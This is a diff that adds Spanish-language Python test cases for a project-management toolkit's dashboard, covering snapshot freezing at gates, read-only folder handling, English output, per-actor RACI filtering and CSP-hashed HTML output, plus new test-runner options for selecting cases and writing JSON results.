+    # --- 5 · si el congelado falla, la puerta se registra igual con AVISO; cierre prematuro también congela
+    g2 = "g2"
+    py(NP, "--ruta", g2, "--nombre", "Falla", "--fecha", "2026-10-01", "--ejecutivo", "Laura Méndez", "--gestor", "Martín Suárez")
+    os.makedirs(os.path.join(d, g2, "03-control", "reportes"), exist_ok=True)
+    open(os.path.join(d, g2, "03-control", "reportes", "tableros"), "w").write("no es una carpeta")
+    junta(g2, "autorizar-inicio", d, arts=[("project-brief", "01-inicio/project-brief.md")], por=JUNTA)
+    rf = py(ES, "--proyecto", g2, "puerta", "autorizar-inicio", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-10-05")
+    check("TB-14 si el congelado falla (tableros/ no es una carpeta), la puerta se registra igual (rc 0, fase inicio, D-###) y se avisa",
+          rf.returncode == 0 and est(g2)["fase"] == "inicio" and est(g2)["puertas"][-1].get("decision_id") and "AVISO: no se pudo congelar el tablero" in rf.stdout, det(rf))
+    py(ES, "--proyecto", g, "puerta", "decision-ad-hoc", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-10-25", "--motivo", "cierre prematuro: sin financiamiento")
+    dcp = est(g)["puertas"][-1].get("decision_id", "")
+    rc_ = py(ES, "--proyecto", g, "cierre", "--prematuro", "--decision", dcp)
+    cp_ = [x for x in js(py(TB, "--proyecto", g, "listar", "--json")) if x["tipo"] == "cierre-prematuro"]
+    check("TB-15 cierre --prematuro congela el tablero previo (fase inicio) con la decisión de la junta citada",
+          rc_.returncode == 0 and cp_ and cp_[0]["decision_id"] == dcp and cp_[0]["etiqueta"] == "cierre prematuro"
+          and json.load(open(os.path.join(d, g, cp_[0]["archivo"]), encoding="utf-8"))["ciclo"]["fase"] == "inicio", det(rc_))
+
+    # --- 6 · carpeta de solo lectura: lecturas sin bloqueo ni escrituras (también sin un registro base)
+    w = tempfile.mkdtemp(prefix="pm-tb-ro-"); os.chmod(w, 0o755)
+    try:
+        shutil.copytree(os.path.join(RAIZ, "skills"), os.path.join(w, "skills")); Sw = os.path.join(w, "skills", "pm-estado-proyecto", "scripts")
+        ro = os.path.join(w, "ro"); shutil.copytree(os.path.join(d, g2), ro)
+        shutil.rmtree(os.path.join(ro, ".pm-bloqueo"), ignore_errors=True); os.remove(os.path.join(ro, "03-control", "registros", "supuestos.csv"))
+        for raiz, dirs, archivos in os.walk(w):
+            for x in dirs + archivos: os.chmod(os.path.join(raiz, x), 0o755 if x in dirs else 0o644)
+        antes = _arbol(ro)
+        for raiz, dirs, archivos in os.walk(ro):
+            for x in archivos: os.chmod(os.path.join(raiz, x), 0o444)
+            for x in dirs: os.chmod(os.path.join(raiz, x), 0o555)
+        os.chmod(ro, 0o555)
+        pref, pyro = [], sys.executable
+        if hasattr(os, "geteuid") and os.geteuid() == 0:        # root ignora los permisos: las lecturas corren como nobody
+            sp = shutil.which("setpriv"); nadie = [sp, "--reuid", "65534", "--regid", "65534", "--clear-groups"] if sp else []
+            for cand in [sys.executable, shutil.which("python3")]:   # un intérprete que nobody pueda ejecutar
+                if nadie and cand and subprocess.run(nadie + [cand, "-c", "pass"], capture_output=True).returncode == 0:
+                    pref, pyro = nadie, cand; break
+        if os.name == "nt" or (hasattr(os, "geteuid") and os.geteuid() == 0 and not pref):
+            omitir("carpeta de solo lectura: no se pueden quitar permisos de escritura efectivos (root sin setpriv o Windows)")
+        else:
+            cmds = [("estado.py", "radar", "--json"), ("estado.py", "productos", "--json"), ("estado.py", "contexto", "--json"), ("puertas.py", "estado", "--json"),
+                    ("registro.py", "propuestas", "--json"), ("tablero.py", "generar", "--json")]
+            res = [subprocess.run(pref + [pyro, os.path.join(Sw, c[0]), "--proyecto", ro] + list(c[1:]), capture_output=True, text=True, encoding="utf-8", errors="replace") for c in cmds]
+            malos = [f"{c[0]} {c[1]}: rc={x.returncode} {(x.stdout + x.stderr)[-200:]!r}" for c, x in zip(cmds, res)
+                     if x.returncode != 0 or re.search(r"S-SAN|Permission denied|Traceback|PermissionError|bloqueo /|Modo de solo lectura", x.stdout + x.stderr)]
+            check("TB-16 carpeta de solo lectura (sin .pm-bloqueo/ y sin supuestos.csv): radar, productos, contexto, puertas.py estado, propuestas y tablero.py generar funcionan sin escribir ni tomar el bloqueo",
+                  not malos and _arbol(ro) == antes and json.loads(res[-1].stdout)["formato"] == "pm-tablero/1", " | ".join(malos)[:600])
+    finally:
+        for raiz, dirs, archivos in os.walk(w):
+            for x in dirs: os.chmod(os.path.join(raiz, x), 0o755)
+        os.chmod(w, 0o755); shutil.rmtree(w, ignore_errors=True)
+    os.remove(os.path.join(d, g2, "03-control", "registros", "supuestos.csv"))
+    s1 = js(py(SA, "--proyecto", g2, "--json")); existe1 = os.path.exists(os.path.join(d, g2, "03-control", "registros", "supuestos.csv"))
+    py(SA, "--proyecto", g2, "--reparar")
+    check("TB-17 sanidad sin --reparar informa REG-01 y no recrea el registro (ni toma el bloqueo); con --reparar lo crea",
+          "REG-01" in codigos(s1) and not existe1 and os.path.exists(os.path.join(d, g2, "03-control", "registros", "supuestos.csv")), str(codigos(s1)))
+
+    # --- 7 · proyecto en inglés
+    ge = "en"
+    py(NP, "--ruta", ge, "--nombre", "Portal EN", "--idioma", "en", "--fecha", "2026-10-01", "--ejecutivo", "Laura Mendez", "--gestor", "Martin Suarez")
+    py(RG, "--proyecto", ge, "agregar", "cambios", "--campo", "titulo=Add payments", "--campo", "solicitante=Ann", "--campo", "costo=15000", "--campo", "estado=pendiente-decision")
+    re1, re2 = py(TB, "--proyecto", ge, "generar"), js(py(TB, "--proyecto", ge, "generar", "--json"))
+    junta(ge, "autorizar-inicio", d, arts=[("project-brief", "01-inicio/project-brief.md")], por="Board: Laura Mendez")
+    re3 = py(ES, "--proyecto", ge, "puerta", "autorizar-inicio", "--decision", "aprobado", "--por", "Board: Laura Mendez", "--fecha", "2026-10-05")
+    re4 = py(TB, "--proyecto", ge, "listar")
+    check("TB-18 proyecto en inglés: resumen, columnas, montos ([amount]), congelado («stage») y listar en inglés",
+          re1.returncode == 0 and re1.stdout.startswith("Board of Portal EN") and re2.get("idioma") == "en" and re2["ciclo"]["columnas"][0]["nombre"] == "Starting up (SU)"
+          and "[amount]" in json.dumps(re2) and "Board frozen before the decision" in re3.stdout and "2026-10-05-autorizar-inicio-stage-0" in re4.stdout
+          and "Traceback" not in re1.stderr + re3.stderr, det(re1, re3, re4))
+
+    # --- 8 · tablero por actor (--actor): filtro por raci.csv y por las responsabilidades de cada persona
+    ga = "ga"
+    py(NP, "--ruta", ga, "--nombre", "Actores", "--fecha", "2026-10-01", "--ejecutivo", "Laura Méndez", "--gestor", "Martín Suárez")
+    open(os.path.join(d, ga, "02-planificacion", "wbs.csv"), "w", encoding="utf-8").write(
+        "codigo,nombre,tipo,responsable,esfuerzo_h,costo,ref\n1,Sistema,producto,,,,\n1.1,Clientes,paquete,,10,,\n1.2,Facturación,paquete,,10,,\n1.3,Informes,paquete,,10,,\n")
+    for nom, rol in (("Ana Pérez", "Analista funcional"), ("Bruno Díaz", "Desarrollador"), ("Laura Méndez", "Ejecutiva"), ("Ana Gómez", "Soporte")):
+        py(RG, "--proyecto", ga, "agregar", "stakeholders", "--campo", f"nombre={nom}", "--campo", f"rol_proyecto={rol}")
+    for el, tipo, st, letra in (("1.1", "paquete", "ST-001", "R"), ("1.3", "paquete", "ST-002", "R"), ("1.2", "paquete", "ST-002", "C"), ("1", "producto", "ST-003", "A"), ("pid", "entregable", "ST-001", "I")):
+        py(RG, "--proyecto", ga, "agregar", "raci", "--campo", f"elemento={el}", "--campo", f"tipo_elemento={tipo}", "--campo", f"stakeholder_id={st}", "--campo", f"rol={letra}")
+    for desc, resp, extra in (("Relevar clientes", "Ana Pérez", "fecha_compromiso=2026-10-05"), ("Armar facturación", "Desarrollador: Bruno Díaz", "fecha_compromiso=2026-12-05"),
+                              ("Acción cerrada", "Bruno Díaz", "estado=completada")):
+        py(RG, "--proyecto", ga, "agregar", "acciones", "--campo", f"descripcion={desc}", "--campo", f"responsable={resp}", "--campo", extra)
+    py(RG, "--proyecto", ga, "agregar", "cambios", "--campo", "titulo=Agregar pagos", "--campo", "solicitante=Ana Pérez", "--campo", "estado=pendiente-decision")
+    py(RG, "--proyecto", ga, "agregar", "issues", "--campo", "titulo=Demora", "--campo", "tipo=problema-preocupacion", "--campo", "responsable=Bruno Díaz")
+    py(RG, "--proyecto", ga, "agregar", "riesgos", "--campo", "evento=Proveedor falla", "--campo", "tipo=amenaza", "--campo", "probabilidad=4", "--campo", "impacto=4", "--campo", "propietario=Bruno Díaz")
+    py(RG, "--proyecto", ga, "proponer", "issues", "--campo", "titulo=Falta acceso", "--campo", "tipo=problema-preocupacion", "--por", "Analista: Ana Pérez", "--motivo", "en la daily")
+    os.makedirs(os.path.join(d, ga, "01-inicio"), exist_ok=True)
+    open(os.path.join(d, ga, "01-inicio", "pid.md"), "w", encoding="utf-8").write("---\ntipo: pid\nestado: borrador\n---\n# PID\n")
+    py(ES, "--proyecto", ga, "artefacto", "pid", "--ruta", "01-inicio/pid.md", "--estado", "en-revision")
+    shutil.rmtree(os.path.join(d, ga, ".pm-bloqueo"), ignore_errors=True)
+    antes = _arbol(os.path.join(d, ga))
+    gen = lambda actor, *x: py(TB, "--proyecto", ga, "generar", "--json", "--corte", "2026-10-20", *(["--actor", actor] if actor is not None else []), *x)
+    todo = js(gen(None))
+    vistas = {a_: js(gen(a_)) for a_ in ("ana perez", "Analista funcional", "Desarrollador: Bruno Díaz", "st-002", "ejecutivo", "GESTOR")}
+    act = {k: (v.get("actor") or {}) for k, v in vistas.items()}
+    check("TB-19 --actor resuelve por nombre (sin mayúsculas ni acentos), por rol, por «<rol: nombre>», por ST-### y por un rol de estado.json; bloque actor {id, nombre, rol, letras R/A/C/I} y actor null sin filtro",
+          todo.get("actor", 0) is None and act["ana perez"].get("id") == act["Analista funcional"].get("id") == "ST-001"
+          and act["Desarrollador: Bruno Díaz"].get("id") == act["st-002"].get("id") == "ST-002" and act["ejecutivo"].get("nombre") == "Laura Méndez"
+          and act["GESTOR"].get("nombre") == "Martín Suárez" and act["GESTOR"].get("id") == "" and set(act["ana perez"]) == {"id", "nombre", "rol", "letras"}
+          and act["ana perez"]["letras"] == {"R": ["1.1"], "A": [], "C": [], "I": ["pid"]} and act["st-002"]["letras"] == {"R": ["1.3"], "A": [], "C": ["1.2"], "I": []}
+          and act["ana perez"]["rol"] == "Analista funcional", json.dumps(act, ensure_ascii=False)[:500])
+    def vista(t_):
+        ctl = t_.get("entrega", {}).get("control", {})
+        return {"atencion": sorted(i["ref"] for i in t_.get("atencion", {}).get("items", [])), "productos": sorted((x["ref"], x.get("raci")) for x in t_.get("entrega", {}).get("productos", {}).get("tarjetas", [])),
+                **{r: sorted(x["ref"] for x in v["tarjetas"] + v["propuestas"]) for r, v in ctl.items()}, "artefactos": sorted(t_.get("artefactos", {}).get("elementos", {})),
+                "cerrados": {r: v["cerrados"] for r, v in ctl.items() if v["cerrados"]}}
+    va, vb = vista(vistas["ana perez"]), vista(vistas["st-002"])
+    tot_ok = all(t_["atencion"]["totales"] == {g_: sum(1 for i in t_["atencion"]["items"] if i["grupo"] == g_) for g_ in ("decidir", "escalar", "desbloquear", "vigilar")} for t_ in vistas.values())
+    check("TB-20 cada actor ve solo lo suyo: Ana su paquete R (1.1), su acción, el cambio que pidió, su propuesta y el PID (I); Bruno 1.3 (R) y 1.2 (C), su issue, su riesgo y su acción (cerrados: 1 completada); totales recalculados",
+          va["productos"] == [("1.1", "R")] and va["acciones"] == ["A-001"] and va["cambios"] == ["C-001"] and va["issues"] == ["P-001"] and va["artefactos"] == ["pid"]
+          and set(va["atencion"]) <= {"A-001", "C-001", "P-001"} and vb["productos"] == [("1.2", "C"), ("1.3", "R")] and vb["issues"] == ["I-001"] and vb["acciones"] == ["A-002"]
+          and vb["cambios"] == [] and vb["artefactos"] == [] and "R-001" in vb["atencion"] and vb["cerrados"] == {"acciones": {"completada": 1}} and va["cerrados"] == {}
+          and tot_ok and vistas["ana perez"]["entrega"]["productos"]["conteos"].get("no-iniciado") == 1, json.dumps([va, vb], ensure_ascii=False)[:600])
+    sin_ciclo = lambda t_: json.dumps({k: t_.get(k) for k in ("atencion", "entrega", "artefactos", "eventos")}, ensure_ascii=False)
+    refs_a, refs_b = {r for k, v in va.items() if k != "cerrados" for r in v}, {r for k, v in vb.items() if k != "cerrados" for r in v}
+    lau = vista(vistas["ejecutivo"])
+    check("TB-21 dos actores no se ven entre sí (Ana y Bruno: sin tarjetas, nombres ni eventos del otro); el ciclo y las puertas son comunes; la ejecutiva ve los productos por el código padre (A en 1) y el cambio que decide la junta",
+          not ({x if isinstance(x, str) else x[0] for x in refs_a} & {x if isinstance(x, str) else x[0] for x in refs_b}) and "Bruno" not in sin_ciclo(vistas["ana perez"])
+          and "Ana Pérez" not in sin_ciclo(vistas["st-002"]) and vistas["ana perez"]["ciclo"] == vistas["st-002"]["ciclo"] == todo["ciclo"]
+          and lau["productos"] == [("1.1", "A"), ("1.2", "A"), ("1.3", "A")] and lau["cambios"] == ["C-001"] and "C-001" in lau["atencion"], json.dumps(lau, ensure_ascii=False)[:400])
+    r_no, r_amb = py(TB, "--proyecto", ga, "generar", "--actor", "Nadie Conocido"), py(TB, "--proyecto", ga, "generar", "--actor", "ana")
+    check("TB-22 actor inexistente o ambiguo («ana»: dos Anas): código 1 con mensaje claro y sin traza; generar --actor no escribe nada en la carpeta",
+          r_no.returncode == 1 and "No hay ningún actor «Nadie Conocido»" in r_no.stderr and r_amb.returncode == 1 and "ST-001 Ana Pérez" in r_amb.stderr
+          and "ST-004 Ana Gómez" in r_amb.stderr and "Traceback" not in r_no.stderr + r_amb.stderr and _arbol(os.path.join(d, ga)) == antes, det(r_no, r_amb))
+    # API pública del filtro por actor (la que usa pm-kb): actores() y filtrar_actor() sobre el tablero completo dan lo mismo
+    # que generar --actor, sin modificar el tablero de entrada ni escribir; actor inexistente → ActorInvalido (ValueError)
+    api = os.path.join(d, "api_actor.py")
+    open(api, "w", encoding="utf-8").write(
+        "import json, sys\nsys.path.insert(0, sys.argv[1])\nimport tablero as T\np = sys.argv[2]\nd = json.load(open(sys.argv[3], encoding='utf-8'))\n"
+        "copia = json.dumps(d, sort_keys=True)\nf = T.filtrar_actor(d, p, 'ana perez')\n"
+        "try:\n    T.filtrar_actor(d, p, 'Nadie Conocido'); err = ''\nexcept T.ActorInvalido as x:\n    err = ('ValueError' if isinstance(x, ValueError) else '') + ' ' + str(x)\n"
+        "print(json.dumps({'actores': T.actores(p), 'filtrado': f, 'intacto': json.dumps(d, sort_keys=True) == copia, 'error': err}, ensure_ascii=False))\n")
+    json.dump(todo, open(os.path.join(d, "todo.json"), "w", encoding="utf-8"), ensure_ascii=False)
+    ra = py(api, S, ga, os.path.join(d, "todo.json")); ap = js(ra)
+    nom = {(x.get("id"), x.get("nombre"), x.get("rol")) for x in ap.get("actores", [])}
+    sin_gen = lambda t_: {k: v for k, v in t_.items() if k != "generado"}
+    check("TB-26 API pública: actores() lista a las personas de stakeholders.csv y de los roles (id, nombre, rol, roles) y filtrar_actor(tablero, proyecto, actor) da el mismo tablero que generar --actor, sin tocar el de entrada; actor inexistente → ActorInvalido (ValueError); no escribe",
+          ra.returncode == 0 and {("ST-001", "Ana Pérez", "Analista funcional"), ("ST-002", "Bruno Díaz", "Desarrollador")} <= nom
+          and any(x.get("nombre") == "Martín Suárez" and x.get("roles") == ["gestor_proyecto"] for x in ap.get("actores", []))
+          and sin_gen(ap.get("filtrado") or {}) == sin_gen(vistas["ana perez"]) and ap.get("intacto") is True
+          and ap.get("error", "").startswith("ValueError No hay ningún actor «Nadie Conocido»") and _arbol(os.path.join(d, ga)) == antes,
+          det(ra) + json.dumps({k: ap.get(k) for k in ("intacto", "error")}, ensure_ascii=False)[:300])
+    ha = os.path.join(d, "salida", "actor.html")
+    rh = py(TB, "--proyecto", ga, "generar", "--actor", "Ana Pérez", "--html", ha)
+    doc = open(ha, encoding="utf-8").read() if os.path.exists(ha) else ""
+    pol_a = (re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)">', doc) or [None, ""])[1]
+    gui_a, est_a = re.search(r"<script>(.*?)</script>", doc, re.S), re.search(r"<style>(.*?)</style>", doc, re.S)
+    ok_csp = bool(gui_a and est_a) and f"script-src 'sha256-{hs(gui_a.group(1))}'" in pol_a and f"style-src 'sha256-{hs(est_a.group(1))}'" in pol_a and "unsafe" not in pol_a
+    det_csp = pol_a[:160]
+    dat = re.search(r'<script type="application/json" id="datos-tablero">(.*?)</script>', doc, re.S)
+    rc1 = py(TB, "--proyecto", ga, "congelar", "--etiqueta", "Vista de Ana", "--actor", "ST-001", "--por", "Gestor: Martín Suárez")
+    lst = js(py(TB, "--proyecto", ga, "listar", "--json"))
+    iid = next((x["id"] for x in lst if x.get("actor") == "Ana Pérez"), "")
+    py(RG, "--proyecto", ga, "agregar", "acciones", "--campo", "descripcion=Probar facturación", "--campo", "responsable=Bruno Díaz")
+    py(RG, "--proyecto", ga, "agregar", "acciones", "--campo", "descripcion=Validar clientes", "--campo", "responsable=Ana Pérez")
+    cmpa = js(py(TB, "--proyecto", ga, "comparar", iid or "x", "actual", "--json"))
+    check("TB-23 HTML por actor con la CSP por hash y el bloque actor; congelar --actor queda en listar (actor) y comparar contra «actual» usa el mismo actor (entra solo la acción nueva de Ana)",
+          rh.returncode == 0 and ok_csp and dat and json.loads(dat.group(1))["actor"]["nombre"] == "Ana Pérez" and "Ana Pérez" in re.search(r"<title>(.*?)</title>", doc).group(1)
+          and rc1.returncode == 0 and iid and [x["ref"] for x in cmpa.get("entraron", []) if x["vista"] == "acciones"] == ["A-005"], det(rh, rc1) + det_csp + json.dumps(cmpa, ensure_ascii=False)[:300])
+    try:
+        from playwright.sync_api import sync_playwright
+        with sync_playwright() as pw:
+            b = pw.chromium.launch(); pg = b.new_page(viewport={"width": 390, "height": 800}); errores = []
+            pg.on("pageerror", lambda x: errores.append(str(x)))
+            pg.add_init_script("window.__csp = []; document.addEventListener('securitypolicyviolation', function (e) { window.__csp.push(e.violatedDirective); });")
+            pg.goto("file://" + os.path.abspath(ha)); pg.wait_for_load_state("load"); pg.click("button[data-vista=entrega]")
+            viol, cab, chips = pg.evaluate("window.__csp"), pg.text_content("#cabecera") or "", pg.evaluate("Array.from(document.querySelectorAll('.chip')).map(function (x) { return x.textContent; })")
+            b.close()
+        check("TB-24 HTML por actor en Chromium: la cabecera dice de quién es la vista y las tarjetas muestran su letra RACI, sin violaciones de CSP ni errores",
+              not viol and not errores and "Vista de Ana Pérez (Analista funcional)" in cab and "RACI R" in chips, f"{viol} {errores[:2]} {cab[:160]!r} {chips[:6]}")
+    except ImportError:
+        omitir("tablero por actor en navegador: falta playwright para Python")
+    except Exception as x:
+        omitir(f"tablero por actor en navegador: Chromium no arrancó: {str(x).splitlines()[0][:120]}")
+    py(RG, "--proyecto", ge, "agregar", "stakeholders", "--campo", "nombre=Ann Lee", "--campo", "rol_proyecto=Business analyst")
+    py(RG, "--proyecto", ge, "agregar", "acciones", "--campo", "descripcion=Map customers", "--campo", "responsable=Ann Lee")
+    e1, e2, e3 = py(TB, "--proyecto", ge, "generar", "--actor", "ann lee"), js(py(TB, "--proyecto", ge, "generar", "--json", "--actor", "Business analyst")), py(TB, "--proyecto", ge, "generar", "--actor", "Nobody")
+    check("TB-25 por actor en inglés: resumen («Actor: … only their items»), JSON filtrado y actor inexistente con mensaje en inglés (código 1)",
+          e1.returncode == 0 and "Actor: Ann Lee (Business analyst)" in e1.stdout and "only their items" in e1.stdout
+          and [x["ref"] for x in e2.get("entrega", {}).get("control", {}).get("acciones", {}).get("tarjetas", [])] == ["A-001"]
+          and e3.returncode == 1 and "No actor «Nobody»" in e3.stderr and "Traceback" not in e1.stderr + e3.stderr, det(e1, e3))
+
+
+def _letra(f):
+    """Letra del caso tal como la muestra su encabezado («Caso A ·», «== KB ·») o su docstring («KB: …»)."""
+    import inspect
+    try: src = inspect.getsource(f)
+    except (OSError, TypeError): src = ""
+    m = re.search(r'print\(f?"(?:\\n)*(?:Caso|==) ([A-Z][A-Z0-9]*) ·', src) or re.search(r'^\s*"""([A-Z][A-Z0-9]*):', src, re.M)
+    return m.group(1) if m else f.__name__[len("caso_"):]
+
+def _argumento(nombre):
+    if nombre not in sys.argv: return None
+    i = sys.argv.index(nombre)
+    if i + 1 >= len(sys.argv) or sys.argv[i + 1].startswith("--"): sys.exit(f"{nombre}: falta el valor")
+    return sys.argv[i + 1]
+
+def _envolver(f, letra, pedidas):
+    """Un caso que lanza una excepción cuenta como FALLO con su nombre y la corrida sigue (como `eslabon` en la integración)."""
+    def envuelto(*a, **k):
+        if CASO["actual"] is not None: return f(*a, **k)          # caso llamado desde otro caso
+        if pedidas is not None and letra not in pedidas: return None
+        CASO["actual"] = letra; ok0, fa0, om0, t0 = RES["ok"], RES["fallo"], len(RES["omitidas"]), time.time()
+        try:
+            return f(*a, **k)
+        except (Exception, SystemExit) as x:
+            import traceback
+            donde = " ← ".join(f"{os.path.basename(fr.filename)}:{fr.lineno}" for fr in reversed(traceback.extract_tb(x.__traceback__)[-3:]))
+            check(f"{letra} · el caso se ejecutó sin errores ({f.__name__})", False, f"{type(x).__name__}: {str(x)[:400]} · en {donde}")
+        finally:
+            RES["casos"][letra] = {"funcion": f.__name__, "ok": RES["ok"] - ok0, "fallo": RES["fallo"] - fa0,
+                                   "omitidas": len(RES["omitidas"]) - om0, "duracion_s": round(time.time() - t0, 1)}
+            CASO["actual"] = None
+    envuelto.__name__, envuelto.__doc__ = f.__name__, f.__doc__
+    return envuelto
+
+def _envolver_casos():
+    """Envuelve cada caso_* (también los que se agreguen) y aplica --casos. Devuelve {letra: función}."""
+    sel = _argumento("--casos")
+    pedidas = {c.strip().upper() for c in sel.split(",") if c.strip()} if sel else None
+    letras = {}
+    for nombre, f in list(globals().items()):
+        if nombre.startswith("caso_") and callable(f):
+            letra = _letra(f); letras[letra] = nombre
+            globals()[nombre] = _envolver(f, letra, pedidas)
+    if pedidas and pedidas - set(letras):
+        sys.exit(f"--casos: letra(s) desconocida(s) {', '.join(sorted(pedidas - set(letras)))}; disponibles: {', '.join(sorted(letras))}")
+    return letras
+
 def main():
     if "-h" in sys.argv or "--help" in sys.argv:
         print(__doc__.strip()); return
+    letras = _envolver_casos()
+    if "--listar" in sys.argv:
+        for l_, n_ in sorted(letras.items()): print(f"{l_:4} {n_}")
+        return
+    salida_json = _argumento("--json")
+    t_ini = time.time()
     tmp = tempfile.mkdtemp(prefix="pm-method-pruebas-")
     try:
         caso_v6(tmp); caso_v6_real(tmp); caso_v4(tmp); caso_nativo(tmp); caso_guardian(tmp); caso_puertas(tmp); caso_puertas_bmad(tmp); caso_regresiones(tmp); caso_interesados(tmp); caso_riesgos_fuentes(tmp); caso_riesgos_opciones(tmp); caso_controles(tmp); caso_control_cambio(tmp); caso_supuestos(tmp); caso_webinar(tmp); caso_ficha(tmp); caso_documentos(tmp); caso_seguridad(tmp); caso_endurecimiento(tmp); caso_mapas(tmp); caso_salidas(tmp); caso_personas(tmp)
@@ -3183,11 +4213,26 @@ def main():
         caso_pm_kb(tmp)
         caso_diagram_design(tmp)
         caso_ayuda(tmp)
+        caso_robustez(tmp)
+        caso_caminos_alternos(tmp)
+        caso_correcciones_263(tmp)
+        caso_tablero(tmp)
         if "--sin-integracion" not in sys.argv: caso_integracion(tmp)
     finally:
         if "--conservar" not in sys.argv: shutil.rmtree(tmp, ignore_errors=True)
         else: print(f"Conservado en {tmp}")
-    print(f"\nResultado: {RES['ok']} OK · {RES['fallo']} FALLO")
+    if RES["omitidas"]:
+        print(f"\nOmitidas ({len(RES['omitidas'])}, por dependencia o herramienta faltante):")
+        for o in RES["omitidas"]: print(f"  [{o['caso']}] {o['motivo']}")
+    if RES["fallos"]:
+        print(f"\nFallos ({len(RES['fallos'])}):")
+        for x in RES["fallos"]: print(f"  [{x['caso']}] {x['comprobacion'][:160]}")
+    print(f"\nResultado: {RES['ok']} OK · {RES['fallo']} FALLO · {len(RES['omitidas'])} omitidas")
+    if salida_json:
+        os.makedirs(os.path.dirname(os.path.abspath(salida_json)), exist_ok=True)
+        with open(salida_json, "w", encoding="utf-8") as fh:
+            json.dump({"python": sys.version.split()[0], "ok": RES["ok"], "fallo": RES["fallo"], "fallos": RES["fallos"],
+                       "omitidas": RES["omitidas"], "casos": RES["casos"], "duracion_s": round(time.time() - t_ini, 1)}, fh, ensure_ascii=False, indent=1)
     sys.exit(1 if RES["fallo"] else 0)
 
 if __name__ == "__main__":
